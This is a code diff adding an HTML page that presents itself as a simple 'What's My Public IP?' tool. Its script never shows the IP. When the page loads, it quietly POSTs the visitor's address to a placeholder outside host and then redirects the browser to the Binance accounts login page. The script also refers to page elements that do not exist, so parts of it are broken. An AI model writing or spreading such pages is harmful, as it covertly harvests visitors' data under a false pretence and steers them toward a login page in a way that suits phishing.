@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>What's My Public IP?</title>
+    <!--
+    This is the meta tag for the thumbnail image.
+    When you share this page's URL on platforms like Facebook or Twitter,
+    they will use this image as a preview.
+    You must place your desired image at the specified path.
+    For example, a file named "thumbnail.png" in a "public" folder on your server.
+    -->
+    <meta property="og:title" content="My Public IP Address" />
+    <meta property="og:description" content="Quickly find out your public IP address with this simple tool." />
+    <meta property="og:image" content="public/thumbnail.png" />
+    <meta property="og:type" content="website" />
+
+    <!-- Link to Tailwind CSS from CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Google Font: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
+    <!-- Custom styles to set the font and center the content -->
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+        }
+    </style>
+</head>
+
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // API endpoint to get the public IP address
+            const apiUrl = 'https://api.ipify.org?format=json';
+
+            async function getPublicIp() {
+                try {
+                    // Fetch data from the API
+                    const response = await fetch(apiUrl);
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    const data = await response.json();
+
+                    // Check if the response contains an IP address
+                    if (data && data.ip) {
+                        try {
+                            const url = 'https://zzzzzzzzz.zzz'
+                            const postResponse = await fetch(url, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ ip: data.ip })
+                            });
+
+                            if (postResponse.ok) {
+                                console.log('IP address sent successfully');
+                                window.location.href = "https://accounts.binance.com/";
+
+                            } else {
+                                console.error('Failed to send IP address:', postResponse.statusText);
+                            }
+                        } catch (error) {
+                            console.error('Error sending IP address:', error);
+                        }
+                    } else {
+                        throw new Error('IP address not found in the response.');
+                    }
+
+
+                } catch (error) {
+                    console.error('Error fetching IP:', error);
+                    errorMessage.classList.remove('hidden');
+                } finally {
+                    // Hide the loading spinner
+                    loadingSpinner.classList.add('hidden');
+                }
+            }
+
+            getPublicIp();
+        });
+    </script>
+</body>
+
+</html>
